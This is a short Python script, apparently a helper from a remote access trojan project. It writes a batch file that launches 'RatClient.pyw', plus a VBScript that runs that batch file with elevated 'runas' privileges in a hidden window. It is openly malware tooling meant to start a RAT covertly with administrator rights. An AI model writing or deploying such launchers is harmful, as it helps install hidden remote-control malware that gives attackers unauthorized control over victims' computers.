import os
import sys

def main():
    # Find the path of this file which is located in the same folder as the file needed to be edited

    path = os.path.dirname(os.path.abspath(__file__))
    print(path)

    # the batch code to run the rat
    drive = path.split("\\")[0]
    bat_code = f'{drive}\nCD "{path}"\n"{sys.executable}" "{path}\\RatClient.pyw"'
    print(bat_code)
    path = os.path.dirname(os.path.abspath(__file__))
    # open file to edit it
    try:
        with open(path + '\\runrat.bat', 'w') as f:
            f.write(bat_code)
    except:
        print("try again, error occurred")

    # the visual basic code to run the batch file
    vbs_code = 'Set Shell = CreateObject("Shell.Application")\n' \
               f'Shell.ShellExecute "{path}\\runrat.bat", , , "runas", 0'
    # open file to edit it
    try:
        with open(path + '\\runRatBat.vbs', 'w') as f:
            f.write(vbs_code)
    except:
        print("try again, error occurred")

if __name__ == "__main__":
    main()
